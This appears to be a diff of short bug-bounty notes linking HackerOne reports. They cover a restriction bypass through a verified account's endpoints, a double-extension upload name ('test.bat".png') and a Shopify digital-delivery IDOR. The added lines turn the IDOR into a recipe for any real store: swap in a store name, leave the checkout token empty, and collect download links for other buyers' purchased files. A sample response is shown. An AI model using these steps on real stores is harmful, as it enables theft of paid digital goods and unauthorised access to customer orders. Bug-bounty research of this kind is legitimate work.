@@ -1,9 +1,16 @@
 1)create 2 account. verify 1st account. in second account find that missing options from 1st account that only visible when verify. then use 1st account endpoints to bypass the restrictions
 https://hackerone.com/reports/1691603
+
 2)use this to upload/send file name as test.bat".png 
 https://hackerone.com/reports/1215263
+
 3)https://delivery.shopifyapps.com/checkout/get_download_link?callback=jQuery22009741786286098322_1606361688834&shop=superhacks.myshopify.com&checkout_token=1c0869d74100cd3582916a93a4bce741&_=1606361688835
 remove numbers id like below
 https://delivery.shopifyapps.com/checkout/get_download_link?callback=jQuery&shop=superhacks.myshopify.com&checkout_token=
-the response is same with&without id numbers then see hacktivity below
+the response is same with&without id numbers with download file/some idor without auth by checking in incognito with link. then see hacktivity below
 https://hackerone.com/reports/1044285
+| continue below |
+Find a website that sells digital assets and is made using Shopify and uses the same default Shopify logic
+https://delivery.shopifyapps.com/checkout/check_order?callback=jQuery&shop=**superhacks**.myshopify.com&checkout_token= REPLACE "superhacks" with THE STORE NAME YOU WANT TO TEST.
+And That's it... whenever an order is placed, You will get the link in the following format jQuery
+({"ready":true,"links":[{"name":"PG000892.zip","product_name":"WILD WOLF","url":"https://superhacks.com/a/downloads/-/d6d6528fb49ed4d5/5fabe0193543d2cf","download_limit":2,"filesize":"3.07 MB"}]}) 
